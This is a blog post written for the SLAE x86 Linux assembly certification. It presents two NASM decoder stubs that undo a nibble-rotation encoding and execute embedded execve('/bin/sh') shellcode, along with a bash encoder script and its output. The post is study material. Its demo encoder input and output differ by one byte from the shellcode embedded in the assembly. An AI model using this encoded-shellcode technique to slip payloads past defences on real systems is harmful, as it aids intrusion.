---
layout: post
title: "SLAE x86 Exam Part 4"
description: "SLAE x86 Exam Part 4: Decoder"
modified: 2018-05-31T05:30:00-05:00
tags: [pentest, asm, x86, slae]
---

# Overview
This blog post has been created for completing the requirements of the
SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](/http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1260

---

In this exercise, we were instructed to create an decoder similar to the
"insertion" decoder covered earlier in the course.  This was, for me, perhaps 
the most educational challenge in the exam.  It served to highlight a number of
deficiencies in my shellcoding knowledge, and gave me a chance to really drive
home some of the register interactions I had skimmed over previously.  

After exploring a handful of "encodings", I settled on a simple byte rotation,
swapping the order of each byte (`0xab` -> `0xba`) through the use of a 4-bit
`ror`.  I liked this method because it was simple, did not require any
alterations to the original shellcode, and would not introduce null bytes.

The approach I took requires the shellcode itself to be free of null bytes, save
for the termination.

Here are two implementations of this approach.  The first reads a single byte 
at a time into `BL` from `ESI`, while the second reads a `DWORD` into `EBX` and 
uses a loop to rotate each of 4 bytes.  I believe the former is the superior
method due to its simplicity and smaller footprint, but wanted to include both
to demonstrate the process of refinement over the course of my efforts.

{% highlight nasm %}
global _start

section .text
_start:
    jmp call_shellcode      ; Go to call_shellcode

decoder: 
    pop esi                 ; Get address of shellcode
    xor eax,eax             ; Clear EAX

decode:                     ; Main decode loop
    mov byte bl,[esi+eax]   ; Move next byte into BL
    ror bl,4                ; Rotate lowest byte 4 times (0xab -> 0xba)
    mov byte [esi+eax],bl   ; Move byte back into current offset in ESI

    cmp bl,bh               ; End of shellcode?
    jz shellcode            ; If so, execute shellcode

    inc al                  ; Otherwise, increment shellcode position
    jmp short decode        ; Go back to top of decode loop

call_shellcode:
    call decoder            ; Call decoder function
    shellcode: db 0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08,0x00
{% endhighlight %}

{% highlight nasm %}
global _start

section .text
_start:
    jmp call_shellcode      ; Go to call_shellcode

decoder: 
    pop esi                 ; Get address of shellcode
    xor eax,eax             ; Clear EAX

decode:                     ; Main decode loop
    mov dword ebx,[esi+eax] ; Get current dword in shellcode
    push 0x4                ; Loop 4 times
    pop ecx

rotate_once:
    ror bl,4                ; Rotate lowest byte 4 times (0xab -> 0xba)
    rol ebx,8               ; Move to next byte in current dword
    loop rotate_once        ; Loop until all 4 bytes have been rotated

    mov dword [esi+eax],ebx ; Put byte back in esi
    cmp bl,ch               ; End of shellcode?
    jz shellcode            ; If so, execute shellcode

    add al,0x4              ; Otherwise, increment shellcode position
    jmp short decode        ; Go back to top of decode loop

call_shellcode:
    call decoder            ; Call decoder function
    shellcode: db 0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08,0x00
{% endhighlight %}

Finally, a simple script to handle encoding of the original shellcode:

{% highlight bash %}
#!/bin/bash

[ -z $1 ] && echo "Usage: $(basename $(readlink -f $0)) <shellcode>"

for i in $(echo $1 | tr "," " "); do
    echo 0x${i:3}${i:2:1}
done | tr "\n" "," | rev | cut -c2- | rev
{% endhighlight %}

{% highlight bash %}
$ ./encode.sh "0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x68,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0x00"
0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x86,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08,0x00
{% endhighlight %}

## Screenshots

![Execution of encoder/decoder]({{ "/assets/images/4.1-decoder.png" | absolute_url}})
